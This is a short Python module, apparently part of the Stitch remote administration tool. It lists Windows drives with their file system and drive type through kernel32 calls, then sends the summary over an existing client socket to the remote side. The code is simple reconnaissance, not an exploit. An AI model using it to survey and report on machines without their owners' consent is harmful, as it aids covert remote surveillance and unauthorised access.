# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
# heavily based on http://stackoverflow.com/questions/17028221/how-do-i-search-for-a-file-only-on-usb-flash-drives

import sys
import ctypes

# Drive types
DRIVE_UNKNOWN     = 0  # The drive type cannot be determined.
DRIVE_NO_ROOT_DIR = 1  # The root path is invalid; for example, there is no volume mounted at the specified path.
DRIVE_REMOVABLE   = 2  # The drive has removable media; for example, a floppy drive, thumb drive, or flash card reader.
DRIVE_FIXED       = 3  # The drive has fixed media; for example, a hard disk drive or flash drive.
DRIVE_REMOTE      = 4  # The drive is a remote (network) drive.
DRIVE_CDROM       = 5  # The drive is a CD-ROM drive.
DRIVE_RAMDISK     = 6  # The drive is a RAM disk.

# Map drive types to strings
DRIVE_TYPE_MAP = { DRIVE_UNKNOWN     : 'DRIVE_UNKNOWN',
                   DRIVE_NO_ROOT_DIR : 'DRIVE_NO_ROOT_DIR',
                   DRIVE_REMOVABLE   : 'DRIVE_REMOVABLE',
                   DRIVE_FIXED       : 'DRIVE_FIXED',
                   DRIVE_REMOTE      : 'DRIVE_REMOTE',
                   DRIVE_CDROM       : 'DRIVE_CDROM',
                   DRIVE_RAMDISK     : 'DRIVE_RAMDISK'}

kernel32 = ctypes.windll.kernel32
volumeNameBuffer = ctypes.create_unicode_buffer(1024)
fileSystemNameBuffer = ctypes.create_unicode_buffer(1024)
drives = []
bitmask = kernel32.GetLogicalDrives()
letter = ord('A')
while bitmask > 0:
    if bitmask & 1:
        drives.append(chr(letter) + ':\\')
    bitmask >>= 1
    letter += 1
serial_number = None
max_component_length = None
file_system_flags = None

summary = ''
for d in drives:
    drive_type = kernel32.GetDriveTypeA('%s\\' % d)
    rc = kernel32.GetVolumeInformationW(
        ctypes.c_wchar_p(d),
        volumeNameBuffer,
        ctypes.sizeof(volumeNameBuffer),
        serial_number,
        max_component_length,
        file_system_flags,
        fileSystemNameBuffer,
        ctypes.sizeof(fileSystemNameBuffer)
    )
    summary += d
    summary += '\n===='
    summary += "\nFile Type\t:{}".format(fileSystemNameBuffer.value)
    summary += "\nDrive Type\t:{}\n\n".format(DRIVE_TYPE_MAP[drive_type])
send(client_socket, summary)
